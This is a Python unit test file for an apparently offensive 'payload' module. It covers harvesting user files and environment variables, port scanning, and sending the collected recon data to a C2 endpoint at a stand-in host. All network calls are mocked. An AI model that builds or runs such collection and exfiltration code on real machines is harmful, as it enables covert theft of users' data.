"""
Unit tests for RAPTOR Enhanced Payload v2.0
Tests file enumeration, system info gathering, and C2 communication
"""
import os
import sys
import unittest
import tempfile
import shutil
from pathlib import Path
from unittest.mock import patch, MagicMock

# Add src/core to Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src', 'core'))

import payload_v2


class TestFileEnumeration(unittest.TestCase):
    """Test file enumeration functionality"""
    
    def setUp(self):
        """Create temporary directory structure for testing"""
        self.test_dir = tempfile.mkdtemp()
        
        # Create test directory structure
        # test_dir/
        #   ├── file1.txt
        #   ├── file2.pdf
        #   ├── .hidden_file
        #   └── subdir/
        #       ├── file3.docx
        #       └── subsubdir/
        #           └── file4.xlsx
        
        # Root level files
        Path(self.test_dir, "file1.txt").write_text("test content 1")
        Path(self.test_dir, "file2.pdf").write_text("test content 2")
        Path(self.test_dir, ".hidden_file").write_text("hidden content")
        
        # Subdirectory
        subdir = Path(self.test_dir, "subdir")
        subdir.mkdir()
        Path(subdir, "file3.docx").write_text("test content 3")
        
        # Sub-subdirectory
        subsubdir = Path(subdir, "subsubdir")
        subsubdir.mkdir()
        Path(subsubdir, "file4.xlsx").write_text("test content 4")
    
    def tearDown(self):
        """Clean up temporary directory"""
        shutil.rmtree(self.test_dir)
    
    def test_enumerate_files_basic(self):
        """Test basic file enumeration"""
        files = payload_v2.enumerate_files([self.test_dir], max_files=100, max_depth=5)
        
        # Should find all 5 files
        self.assertEqual(len(files), 5)
        
        # Check that all files have required metadata
        for file in files:
            self.assertIn('name', file)
            self.assertIn('path', file)
            self.assertIn('extension', file)
            self.assertIn('size', file)
            self.assertIn('modified_time', file)
            self.assertIn('created_time', file)
    
    def test_enumerate_files_max_limit(self):
        """Test that max_files limit is respected"""
        files = payload_v2.enumerate_files([self.test_dir], max_files=3, max_depth=5)
        
        # Should stop at 3 files
        self.assertLessEqual(len(files), 3)
    
    def test_enumerate_files_depth_limit(self):
        """Test that max_depth limit is respected"""
        files = payload_v2.enumerate_files([self.test_dir], max_files=100, max_depth=2)
        
        # Should find files at depth 0, 1, and 2
        # Root level: file1.txt, file2.pdf, .hidden_file (depth 0)
        # subdir/: file3.docx (depth 1)  
        # Should NOT find subdir/subsubdir/file4.xlsx (depth 2 - too deep)
        
        filenames = [f['name'] for f in files]
        self.assertIn('file1.txt', filenames)
        self.assertIn('file3.docx', filenames)
        # file4.xlsx should be found at max_depth=2
        # Test with depth 1 instead
        files_shallow = payload_v2.enumerate_files([self.test_dir], max_files=100, max_depth=1)
        filenames_shallow = [f['name'] for f in files_shallow]
        # At depth 1, should not find subsubdir files
        self.assertNotIn('file4.xlsx', filenames_shallow)
    
    def test_enumerate_files_extensions(self):
        """Test that file extensions are correctly extracted"""
        files = payload_v2.enumerate_files([self.test_dir], max_files=100, max_depth=5)
        
        extensions = {f['extension'] for f in files}
        expected_extensions = {'.txt', '.pdf', '.docx', '.xlsx', ''}  # empty for .hidden_file
        
        self.assertEqual(extensions, expected_extensions)
    
    def test_enumerate_files_nonexistent_dir(self):
        """Test handling of nonexistent directory"""
        files = payload_v2.enumerate_files(['/nonexistent/directory'], max_files=100, max_depth=5)
        
        # Should return empty list without crashing
        self.assertEqual(len(files), 0)
    
    def test_enumerate_files_multiple_dirs(self):
        """Test enumeration of multiple directories"""
        # Create second test directory
        test_dir2 = tempfile.mkdtemp()
        Path(test_dir2, "file5.txt").write_text("test content 5")
        
        try:
            files = payload_v2.enumerate_files(
                [self.test_dir, test_dir2], 
                max_files=100, 
                max_depth=5
            )
            
            # Should find files from both directories
            self.assertGreaterEqual(len(files), 6)
            
        finally:
            shutil.rmtree(test_dir2)


class TestSystemInfo(unittest.TestCase):
    """Test system information gathering"""
    
    def test_gather_system_info(self):
        """Test that system info gathering returns required fields"""
        recon_data = payload_v2.gather_system_info()
        
        # Check required fields
        required_fields = [
            'os_name', 'os_version', 'os_release', 'architecture',
            'hostname', 'current_user', 'machine', 'processor',
            'python_version', 'is_admin', 'env_vars'
        ]
        
        for field in required_fields:
            self.assertIn(field, recon_data)
            self.assertIsNotNone(recon_data[field])
    
    def test_os_name_valid(self):
        """Test that OS name is a valid value"""
        recon_data = payload_v2.gather_system_info()
        
        valid_os = ['Windows', 'Linux', 'Darwin']
        self.assertIn(recon_data['os_name'], valid_os)


class TestTargetDirectories(unittest.TestCase):
    """Test target directory selection"""
    
    @patch('payload_v2.platform.system')
    @patch('payload_v2.os.path.exists')
    def test_get_target_directories_windows(self, mock_exists, mock_system):
        """Test directory selection for Windows"""
        mock_system.return_value = 'Windows'
        mock_exists.return_value = True
        
        with patch.dict(os.environ, {'USERPROFILE': 'C:\\Users\\Test', 'APPDATA': 'C:\\Users\\Test\\AppData\\Roaming'}):
            dirs = payload_v2.get_target_directories()
            
            # Should include Windows-specific directories
            self.assertTrue(any('Documents' in d for d in dirs))
            self.assertTrue(any('Desktop' in d for d in dirs))
    
    @patch('payload_v2.platform.system')
    @patch('payload_v2.os.path.exists')
    def test_get_target_directories_linux(self, mock_exists, mock_system):
        """Test directory selection for Linux"""
        mock_system.return_value = 'Linux'
        mock_exists.return_value = True
        
        with patch('payload_v2.os.path.expanduser', return_value='/home/test'):
            dirs = payload_v2.get_target_directories()
            
            # Should include Linux-specific directories
            self.assertTrue(any('Documents' in d for d in dirs))
            self.assertTrue(any('.config' in d for d in dirs))


class TestPortScanning(unittest.TestCase):
    """Test port scanning functionality"""
    
    @patch('payload_v2.socket.socket')
    def test_scan_ports_basic(self, mock_socket):
        """Test basic port scanning"""
        # Mock socket to return connection success (port open)
        mock_sock_instance = MagicMock()
        mock_sock_instance.connect_ex.return_value = 0  # Success
        mock_socket.return_value = mock_sock_instance
        
        open_ports = payload_v2.scan_ports(target="127.0.0.1", start_port=80, end_port=81)
        
        # Should find port 80
        self.assertIn(80, open_ports)
    
    @patch('payload_v2.socket.socket')
    def test_scan_ports_closed(self, mock_socket):
        """Test scanning closed ports"""
        # Mock socket to return connection failure (port closed)
        mock_sock_instance = MagicMock()
        mock_sock_instance.connect_ex.return_value = 1  # Failure
        mock_socket.return_value = mock_sock_instance
        
        open_ports = payload_v2.scan_ports(target="127.0.0.1", start_port=8888, end_port=8889)
        
        # Should not find any open ports
        self.assertEqual(len(open_ports), 0)


class TestC2Communication(unittest.TestCase):
    """Test C2 server communication"""
    
    @patch('payload_v2.requests.post')
    def test_send_to_c2_success(self, mock_post):
        """Test successful C2 communication"""
        # Mock successful response
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'status': 'success',
            'session_id': 'test-session-123',
            'message': 'Scan received'
        }
        mock_post.return_value = mock_response
        
        payload = {'recon_data': {'hostname': 'test'}}
        response = payload_v2.send_to_c2(payload, 'http://test.com/api/submit_scan/')
        
        self.assertIsNotNone(response)
        self.assertEqual(response['status'], 'success')
        self.assertIn('session_id', response)
    
    @patch('payload_v2.requests.post')
    def test_send_to_c2_connection_error(self, mock_post):
        """Test C2 communication with connection error"""
        # Mock connection error
        mock_post.side_effect = payload_v2.requests.exceptions.ConnectionError("Connection refused")
        
        payload = {'recon_data': {'hostname': 'test'}}
        response = payload_v2.send_to_c2(payload, 'http://test.com/api/submit_scan/')
        
        # Should return None on connection error
        self.assertIsNone(response)
    
    @patch('payload_v2.requests.post')
    def test_send_to_c2_timeout(self, mock_post):
        """Test C2 communication with timeout"""
        # Mock timeout error
        mock_post.side_effect = payload_v2.requests.exceptions.Timeout("Request timeout")
        
        payload = {'recon_data': {'hostname': 'test'}}
        response = payload_v2.send_to_c2(payload, 'http://test.com/api/submit_scan/')
        
        # Should return None on timeout
        self.assertIsNone(response)


class TestLocalSave(unittest.TestCase):
    """Test local file saving"""
    
    def test_save_local_copy(self):
        """Test saving payload to local file"""
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as f:
            temp_path = f.name
        
        try:
            payload = {
                'recon_data': {
                    'hostname': 'test',
                    'os_name': 'Linux'
                }
            }
            
            payload_v2.save_local_copy(payload, temp_path)
            
            # File should exist
            self.assertTrue(os.path.exists(temp_path))
            
            # File should contain valid JSON
            import json
            with open(temp_path, 'r') as f:
                loaded = json.load(f)
            
            self.assertEqual(loaded['recon_data']['hostname'], 'test')
            
        finally:
            if os.path.exists(temp_path):
                os.unlink(temp_path)


if __name__ == '__main__':
    print("=" * 70)
    print("🧪 RAPTOR Enhanced Payload v2.0 - Unit Tests")
    print("=" * 70)
    print()
    
    # Run tests with verbose output
    unittest.main(verbosity=2)
